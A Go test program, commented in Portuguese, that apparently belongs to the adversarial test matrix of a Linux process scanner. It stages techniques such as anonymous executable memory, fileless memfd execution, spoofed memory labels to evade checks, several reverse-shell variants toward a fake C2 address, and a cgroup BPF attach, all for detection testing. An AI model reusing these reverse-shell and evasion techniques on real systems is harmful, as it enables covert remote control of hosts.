// plant monta UMA técnica de ataque no próprio processo e dorme, para a
// aletheia escaneá-lo. É material de TESTE da matriz adversarial — não é
// malicioso: cada técnica é a forma estrutural que um check afirma pegar (ou
// que se quer provar como ponto cego), montada de propósito para ser detectada.
//
// SEGURANÇA: tudo é userspace e local. Nada carrega módulo, nada conecta na
// internet (os cenários de rede usam TEST-NET-3, 203.0.113.0/24, que nunca é
// roteada), nada escreve fora de /tmp. Roda no contêiner descartável da matriz.
package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Números de syscall que o pacote syscall da stdlib não exporta (só o
// x/sys/unix, e este projeto não tem dependência externa). São de amd64, onde a
// matriz roda.
const (
	sysMemfdCreate = 319
	sysExecveat    = 322
	sysBPF         = 321
)

func must(err error, o string) {
	if err != nil {
		fmt.Fprintln(os.Stderr, o+":", err)
		os.Exit(1)
	}
}

// nomearVMA dá um rótulo a uma região anônima (PR_SET_VMA_ANON_NAME, 5.17+).
// É o que o JIT moderno faz — e o que um payload pode COPIAR para se esconder
// do proc.maps_exec_anon, que só conta região SEM rótulo. O kernel exibe o nome
// como "[anon:NOME]" e REJEITA colchetes no argumento: passa-se só o NOME.
func nomearVMA(b []byte, nome string) {
	const prSetVMA = 0x53564d41
	n := append([]byte(nome), 0)
	syscall.Syscall6(syscall.SYS_PRCTL, prSetVMA, 0,
		uintptr(unsafe.Pointer(&b[0])), uintptr(len(b)), uintptr(unsafe.Pointer(&n[0])), 0)
}

func bptr(sarg string) *byte {
	b, err := syscall.BytePtrFromString(sarg)
	must(err, "byteptr")
	return b
}

func mmapAnon(prot int) []byte {
	b, err := syscall.Mmap(-1, 0, 4096, prot, syscall.MAP_PRIVATE|syscall.MAP_ANON)
	must(err, "mmap anon")
	copy(b, []byte{0x90, 0x90, 0xc3})
	return b
}

// mapDeArquivo mapeia um arquivo e opcionalmente o apaga (deixando o mapeamento
// "(deleted)"). É a lib aberta com dlopen e removida em seguida.
func mapDeArquivo(path string, prot int, apagar bool) []byte {
	must(os.WriteFile(path, make([]byte, 8192), 0o755), "write "+path)
	fh, err := os.Open(path)
	must(err, "open "+path)
	b, err := syscall.Mmap(int(fh.Fd()), 0, 8192, prot, syscall.MAP_PRIVATE)
	must(err, "mmap "+path)
	if apagar {
		os.Remove(path)
	}
	return b
}

// carregarCgroupSkb carrega um programa cgroup_skb mínimo (r0=1; exit) e
// devolve o descritor. É o que um implante de cgroup BPF faz — sem o payload.
func carregarCgroupSkb() int {
	insns := []byte{
		0xb7, 0, 0, 0, 1, 0, 0, 0, // BPF_MOV64_IMM(R0, 1)
		0x95, 0, 0, 0, 0, 0, 0, 0, // BPF_EXIT
	}
	lic := []byte("GPL\x00")
	log := make([]byte, 4096)
	var a struct {
		progType, insnCnt  uint32
		insns, license     uint64
		logLevel, logSize  uint32
		logBuf             uint64
		kernVer, progFlags uint32
	}
	a.progType = 8 // BPF_PROG_TYPE_CGROUP_SKB
	a.insnCnt = 2
	a.insns = uint64(uintptr(unsafe.Pointer(&insns[0])))
	a.license = uint64(uintptr(unsafe.Pointer(&lic[0])))
	a.logLevel, a.logSize = 1, uint32(len(log))
	a.logBuf = uint64(uintptr(unsafe.Pointer(&log[0])))
	fd, _, e := syscall.Syscall(sysBPF, 5 /*BPF_PROG_LOAD*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	runtime.KeepAlive(insns)
	runtime.KeepAlive(lic)
	runtime.KeepAlive(log)
	if e != 0 {
		must(fmt.Errorf("%v — %s", e, log), "BPF_PROG_LOAD")
	}
	return int(fd)
}

func anexarCgroup(cgFD, progFD int) {
	var a struct{ targetFD, attachBpfFD, attachType, attachFlags uint32 }
	a.targetFD = uint32(cgFD)
	a.attachBpfFD = uint32(progFD)
	a.attachType = 0 // BPF_CGROUP_INET_INGRESS
	_, _, e := syscall.Syscall(sysBPF, 8 /*BPF_PROG_ATTACH*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	if e != 0 {
		must(fmt.Errorf("%v", e), "BPF_PROG_ATTACH")
	}
}

// vivos impede o GC de fechar sockets e pipes que a técnica precisa manter
// abertos enquanto a aletheia escaneia.
var vivos []any

// destinoC2 é TEST-NET-3: reservado para documentação, NUNCA roteado. A conexão
// é local (o listener está no mesmo contêiner), então o peer é "público" pela
// classificação sem que nada saia para a internet.
const destinoC2 = "203.0.113.5:4444"

// ioctls do PTY (amd64).
const (
	tiocGPTN   = 0x80045430
	tiocSPTLCK = 0x40045431
)

func ioctl(fd, req, arg uintptr) {
	syscall.Syscall(syscall.SYS_IOCTL, fd, req, arg)
}

func socketFD(c net.Conn) int {
	f, err := c.(*net.TCPConn).File()
	must(err, "file do socket")
	vivos = append(vivos, c, f)
	return int(f.Fd())
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "uso: plant <tecnica>")
		os.Exit(2)
	}
	var manter [][]byte
	anunciou := false
	switch os.Args[1] {
	// --- REGRESSÃO: cada uma é o que um check afirma pegar ---
	case "rwx-anon": // proc.maps_rwx_anon
		manter = append(manter, mmapAnon(syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC))
	case "rx-anon": // proc.maps_exec_anon (W^X: mmap RW -> mprotect RX)
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		manter = append(manter, b)
	case "deleted-exec": // proc.deleted_mapping (CRITICAL, /tmp)
		manter = append(manter, mapDeArquivo("/tmp/.plant.so", syscall.PROT_READ|syscall.PROT_EXEC, true))
	case "memfd": // proc.memfd_exec: executa a partir de memória anônima, sem disco
		self, err := os.ReadFile("/proc/self/exe")
		must(err, "ler self")
		fd, _, e1 := syscall.Syscall(sysMemfdCreate, uintptr(unsafe.Pointer(bptr("plant"))), 0, 0)
		if e1 != 0 {
			must(e1, "memfd_create")
		}
		_, err = syscall.Write(int(fd), self)
		must(err, "escrever no memfd")
		// execveat(fd, "", [plant, memfd-child], {}, AT_EMPTY_PATH): substitui a
		// imagem por uma que veio de memória. O exe do processo vira /memfd:...
		argv := []*byte{bptr("plant"), bptr("memfd-child"), nil}
		envp := []*byte{nil}
		syscall.Syscall6(sysExecveat, fd, uintptr(unsafe.Pointer(bptr(""))),
			uintptr(unsafe.Pointer(&argv[0])), uintptr(unsafe.Pointer(&envp[0])), 0x1000, 0)
		must(fmt.Errorf("execveat não substituiu a imagem"), "execveat")
	case "memfd-child": // a imagem que veio do memfd: só se anuncia e dorme
		fmt.Printf("PLANT pid=%d tech=memfd\n", os.Getpid())
		os.Stdout.Sync()
		time.Sleep(120 * time.Second)
		return

	// --- PONTO CEGO: técnicas que se quer medir se passam sem sinal ---
	case "rx-anon-rotulada": // maps_exec_anon só conta SEM rótulo: rótulo spoofado esconde
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		nomearVMA(b, "js-executable-memory")
		manter = append(manter, b)
	case "deleted-data": // deleted_mapping exige EXECUTÁVEL: segmento de dado apagado passa
		manter = append(manter, mapDeArquivo("/tmp/.plantd.so", syscall.PROT_READ|syscall.PROT_WRITE, true))

	case "jit-inject": // maps_exec_anon isenta JIT em diretório de sistema: o
		// runner roda ISTO como /usr/bin/node, e a região sem rótulo é isenta.
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		manter = append(manter, b)

	case "listen": // sobe o C2 falso e segura as conexões aceitas ESTABELECIDAS
		ln, err := net.Listen("tcp", destinoC2)
		must(err, "listen "+destinoC2)
		fmt.Printf("LISTEN em %s\n", destinoC2)
		os.Stdout.Sync()
		for {
			c, err := ln.Accept()
			if err != nil {
				continue
			}
			vivos = append(vivos, c)
		}

	case "revshell-direct": // correlate.revshell: fd 0,1,2 no MESMO socket de saída
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		sfd := socketFD(c)
		fmt.Printf("PLANT pid=%d tech=revshell-direct\n", os.Getpid())
		os.Stdout.Sync()
		anunciou = true
		syscall.Dup2(sfd, 0)
		syscall.Dup2(sfd, 1)
		syscall.Dup2(sfd, 2)

	case "revshell-bridge": // correlate.revshell_bridge: shell lê de pipe, ponte
		// (este processo) segura o outro lado do pipe e o socket de saída.
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		_ = socketFD(c) // a ponte (nós) segura o socket
		r, w, err := os.Pipe()
		must(err, "pipe")
		vivos = append(vivos, w) // a ponte segura a ponta de ESCRITA
		nul, _ := os.OpenFile(os.DevNull, os.O_RDWR, 0)
		// o shell REAL: stdin = ponta de LEITURA do pipe, comm vira "sh".
		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
			Files: []uintptr{r.Fd(), nul.Fd(), nul.Fd()},
		})
		must(err, "forkexec sh")
		r.Close() // só o shell precisa da leitura
		fmt.Printf("PLANT pid=%d tech=revshell-bridge\n", shPid)
		os.Stdout.Sync()
		anunciou = true

	case "revshell-pty": // ponte por PTY: o revshell_bridge só cobre pipe, e o
		// PTY não compartilha inode de pipe — o ponto cego declarado.
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		_ = socketFD(c) // a ponte segura o socket
		ptmx, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
		must(err, "abrir /dev/ptmx")
		vivos = append(vivos, ptmx)
		var lock int
		ioctl(ptmx.Fd(), tiocSPTLCK, uintptr(unsafe.Pointer(&lock)))
		var n uint32
		ioctl(ptmx.Fd(), tiocGPTN, uintptr(unsafe.Pointer(&n)))
		slave, err := os.OpenFile(fmt.Sprintf("/dev/pts/%d", n), os.O_RDWR, 0)
		must(err, "abrir o slave do pty")
		// o shell REAL com stdin/stdout/stderr = slave do PTY.
		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
			Files: []uintptr{slave.Fd(), slave.Fd(), slave.Fd()},
		})
		must(err, "forkexec sh")
		slave.Close()
		fmt.Printf("PLANT pid=%d tech=revshell-pty\n", shPid)
		os.Stdout.Sync()
		anunciou = true

	case "cgroup-attach": // kernel.bpf: programa de cgroup atribuído por BPF_PROG_QUERY
		prog := carregarCgroupSkb()
		cgfd, err := syscall.Open("/sys/fs/cgroup", syscall.O_RDONLY, 0)
		must(err, "abrir /sys/fs/cgroup")
		anexarCgroup(cgfd, prog)
		// fecha o fd do PROGRAMA: o único detentor agora é o anexo no cgroup.
		// Sem isso, o descritor aberto já atribuiria, e não seria o cgroup query
		// que estaria sendo provado.
		syscall.Close(prog)
		syscall.Close(cgfd)

	default:
		fmt.Fprintln(os.Stderr, "técnica desconhecida:", os.Args[1])
		os.Exit(2)
	}
	_ = manter
	if !anunciou {
		fmt.Printf("PLANT pid=%d tech=%s\n", os.Getpid(), os.Args[1])
		os.Stdout.Sync()
	}
	time.Sleep(120 * time.Second)
}
